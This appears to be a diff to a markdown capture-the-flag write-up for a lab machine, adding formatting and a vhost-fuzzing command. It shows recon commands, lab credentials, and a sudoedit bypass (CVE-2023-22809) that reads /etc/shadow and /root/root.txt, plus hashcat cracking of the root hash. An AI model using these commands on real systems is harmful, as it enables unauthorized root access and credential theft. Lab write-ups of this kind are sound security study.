@@ -7,7 +7,8 @@ tags: [SSTI, Sudo]
 ---
 
 ### Nmap
-```
+
+```bash
 nmap -p- -T4 <Target-IP> # This will scan all the 65535 port.
 
 nmap -A -p 22,80 -T4 <Target-IP> -oN WhiteRose_Nmap_result # From the above cmd output we can run the 2 ports in Aggressive mode.
@@ -17,7 +18,7 @@ nmap -A -p 22,80 -T4 <Target-IP> -oN WhiteRose_Nmap_result # From the above cmd 
 
 ### Rustscan
 
-```
+```bash
 rustcan -a <Target-IP> -- -A -oN WhiteRose_nmap_result
 
 #Cmd Breakdown
@@ -30,6 +31,7 @@ rustcan -a <Target-IP> -- -A -oN WhiteRose_nmap_result
 
 
 ### Nmap scan Result
+
 ```
 22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
 
@@ -47,7 +49,8 @@ Given creds from the challange `Olivia Cortez:olivi8`
 ## HTTP (80)
 
 ### Dirsearch
-```
+
+```bash
 dirsearch -u http://<target-IP> 
 ```
 
@@ -55,7 +58,9 @@ dirsearch -u http://<target-IP>
 
 ### Vhost Fuzzing
 
-```
+```bash
+ffuf -u http://cyprusbank.thm -w subdomain.txt -H "HOST:FUZZ.cuyprusbank.thm" 
+
 www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 167ms]
 admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 167ms]
 ```
@@ -121,7 +126,8 @@ https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis
 ## Exploit
 
 #### To get the root Hash
-```
+
+```bash
 export EDITOR="vi -- /etc/shadow"
 
 sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
@@ -134,7 +140,8 @@ hashcat -a 0 -m 3200 root-hash.txt rockyou.txt
 
 
 #### To get the root flag
-```
+
+```bash
 export EDITOR="vi -- /root/root.txt"
 
 sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
